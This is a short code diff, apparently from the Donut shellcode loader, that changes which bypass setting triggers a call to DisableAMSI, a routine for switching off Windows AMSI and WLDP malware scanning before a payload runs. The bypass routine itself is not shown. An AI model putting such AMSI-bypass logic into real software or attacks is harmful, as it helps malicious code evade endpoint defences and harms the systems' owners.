@@ -167,7 +167,7 @@ DWORD MainProc(LPVOID lpParameter) {
     }
     
     // try bypassing AMSI and WLDP?
-    if(inst->bypass != DONUT_BYPASS_SKIP) {
+    if(inst->bypass != DONUT_BYPASS_NONE) {
       // Try to disable AMSI
       disabled = DisableAMSI(inst);
       DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
